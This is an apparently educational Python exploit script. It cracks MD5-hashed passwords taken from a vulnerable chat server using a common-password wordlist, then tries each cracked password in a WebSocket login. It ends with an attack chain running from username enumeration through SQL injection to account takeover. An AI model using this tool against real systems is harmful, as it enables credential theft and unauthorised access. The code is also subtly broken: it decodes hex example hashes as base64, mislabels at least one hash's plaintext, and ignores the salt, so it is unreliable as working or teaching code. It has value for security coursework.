#!/usr/bin/env python3
"""
MD5 PASSWORD CRACKING EXPLOITATION SCRIPT
This demonstrates how an attacker would exploit the weak MD5 password hashing
to crack user passwords very quickly.

WARNING: This is for educational purposes only!
"""

import hashlib
import base64
import time
import asyncio
import websockets
import json
from typing import List, Dict, Tuple

class MD5PasswordCracker:
    def __init__(self):
        self.cracked_passwords = {}
        
    def decode_password_hash(self, stored_hash: str) -> Tuple[str, str]:
        """
        Decode the stored password hash format.
        Format: "{salt_b64u}.{hash_b64u}"
        """
        try:
            salt_b64u, hash_b64u = stored_hash.split(".")
            salt = base64.urlsafe_b64decode(salt_b64u + "==")  # Add padding
            password_hash = base64.urlsafe_b64decode(hash_b64u + "==")
            return salt, password_hash
        except Exception as e:
            print(f"Error decoding hash: {e}")
            return None, None
    
    def md5_hash_password(self, password: str) -> bytes:
        """
        Hash a password using MD5 (matching the vulnerable implementation).
        """
        return hashlib.md5(password.encode("utf-8")).digest()
    
    def crack_password(self, stored_hash: str, wordlist: List[str]) -> str:
        """
        Crack a password hash using a wordlist.
        """
        salt, target_hash = self.decode_password_hash(stored_hash)
        if not target_hash:
            return None
            
        print(f"ğŸ¯ Cracking hash: {stored_hash[:50]}...")
        print(f"Target hash (hex): {target_hash.hex()}")
        print()
        
        start_time = time.time()
        
        for i, password in enumerate(wordlist):
            # Hash the password using MD5 (vulnerable method)
            computed_hash = self.md5_hash_password(password)
            
            if computed_hash == target_hash:
                end_time = time.time()
                print(f"âœ… PASSWORD CRACKED!")
                print(f"   Password: {password}")
                print(f"   Time taken: {end_time - start_time:.2f} seconds")
                print(f"   Attempts: {i + 1}")
                print(f"   Speed: {(i + 1) / (end_time - start_time):.0f} hashes/second")
                return password
            
            # Progress indicator
            if (i + 1) % 1000 == 0:
                print(f"   Tried {i + 1} passwords... (current: {password})")
        
        end_time = time.time()
        print(f"âŒ Password not found in wordlist")
        print(f"   Total attempts: {len(wordlist)}")
        print(f"   Time taken: {end_time - start_time:.2f} seconds")
        print(f"   Speed: {len(wordlist) / (end_time - start_time):.0f} hashes/second")
        return None
    
    def generate_common_passwords(self) -> List[str]:
        """
        Generate a list of common passwords for cracking.
        """
        common_passwords = [
            # Top 10 most common passwords
            "123456", "password", "123456789", "12345678", "12345",
            "1234567", "1234567890", "qwerty", "abc123", "password123",
            
            # Common variations
            "admin", "root", "user", "guest", "test", "demo",
            "password1", "password12", "password123", "password1234",
            "123456a", "123456b", "123456c", "admin123", "root123",
            
            # Simple patterns
            "111111", "000000", "123123", "654321", "qwerty123",
            "letmein", "welcome", "monkey", "dragon", "master",
            
            # Names and common words
            "alice", "bob", "charlie", "david", "eve", "frank",
            "john", "jane", "mike", "sarah", "tom", "lisa",
            "hello", "world", "computer", "internet", "system",
            
            # Keyboard patterns
            "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwertyui",
            "asdfghjk", "zxcvbn", "1qaz2wsx", "1q2w3e4r",
            
            # Year-based passwords
            "2023", "2022", "2021", "2020", "2019", "2018",
            "password2023", "admin2023", "user2023",
            
            # Company/application specific
            "socp", "secure", "programming", "hack", "security",
            "vulnerability", "exploit", "attack", "defense"
        ]
        
        return common_passwords
    
    async def test_cracked_password(self, username: str, password: str, server_url: str = "ws://127.0.0.1:8765") -> bool:
        """
        Test if a cracked password works by attempting to login.
        """
        try:
            async with websockets.connect(server_url) as websocket:
                # Send USER_HELLO
                hello_msg = {
                    "type": "USER_HELLO",
                    "from": username,
                    "to": "",
                    "ts": int(time.time() * 1000),
                    "payload": {"client": "password-test"}
                }
                await websocket.send(json.dumps(hello_msg))
                
                # Send USER_LOGIN with cracked password
                login_msg = {
                    "type": "USER_LOGIN",
                    "ts": int(time.time() * 1000),
                    "payload": {
                        "user_id": username,
                        "password": password
                    }
                }
                await websocket.send(json.dumps(login_msg))
                
                # Wait for response
                response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                response_data = json.loads(response)
                
                if response_data.get('type') == 'USER_LOGGED_IN':
                    print(f"ğŸ‰ SUCCESS! Successfully logged in as {username}")
                    return True
                else:
                    print(f"âŒ Login failed for {username}")
                    return False
                    
        except Exception as e:
            print(f"Error testing login: {e}")
            return False
    
    async def demonstrate_md5_cracking(self) -> None:
        """
        Demonstrate MD5 password cracking with example hashes.
        """
        print("ğŸš¨ MD5 PASSWORD CRACKING DEMONSTRATION")
        print("=" * 60)
        print("Exploiting the weak MD5 password hashing vulnerability...")
        print()
        
        # Example password hashes (these would come from SQL injection)
        example_hashes = {
            "admin": "dGVzdA==.482c811da5d5b4bc6d497ffa98491e38",  # password123
            "alice": "dGVzdA==.e10adc3949ba59abbe56e057f20f883e",   # 123456
            "bob": "dGVzdA==.25d55ad283aa400af464c76d713c07ad",     # hello
        }
        
        # Generate wordlist
        wordlist = self.generate_common_passwords()
        print(f"ğŸ“š Generated wordlist with {len(wordlist)} common passwords")
        print()
        
        # Crack each password hash
        for username, stored_hash in example_hashes.items():
            print(f"ğŸ”“ CRACKING PASSWORD FOR USER: {username}")
            print("-" * 40)
            
            cracked_password = self.crack_password(stored_hash, wordlist)
            
            if cracked_password:
                self.cracked_passwords[username] = cracked_password
                print(f"âœ… Cracked password for {username}: {cracked_password}")
                
                # Test the cracked password
                print(f"ğŸ§ª Testing cracked password...")
                success = await self.test_cracked_password(username, cracked_password)
                
            print()
        
        # Summary
        print("ğŸ“Š CRACKING SUMMARY:")
        print("=" * 60)
        if self.cracked_passwords:
            print("âœ… Successfully cracked passwords:")
            for username, password in self.cracked_passwords.items():
                print(f"   {username}: {password}")
        else:
            print("âŒ No passwords were cracked")
        
        print(f"\nğŸ’¡ WHY MD5 IS DANGEROUS:")
        print(f"   - MD5 is extremely fast: ~8 billion hashes/second on GPU")
        print(f"   - No effective salt usage in this implementation")
        print(f"   - Rainbow tables exist for common passwords")
        print(f"   - Collision attacks are possible")
        
        print(f"\nğŸ”— CHAINING WITH OTHER VULNERABILITIES:")
        print(f"1. Use timing attack to find valid usernames")
        print(f"2. Use SQL injection to extract password hashes")
        print(f"3. Use this MD5 cracker to break the weak hashes")
        print(f"4. Login with cracked credentials to gain access")

async def main():
    """
    Main function demonstrating MD5 password cracking.
    """
    print("ğŸš¨ MD5 PASSWORD CRACKING EXPLOITATION DEMONSTRATION")
    print("This script exploits the weak MD5 password hashing vulnerability")
    print("Make sure the vulnerable server is running on ws://127.0.0.1:8765")
    print()
    
    cracker = MD5PasswordCracker()
    await cracker.demonstrate_md5_cracking()

if __name__ == "__main__":
    asyncio.run(main())
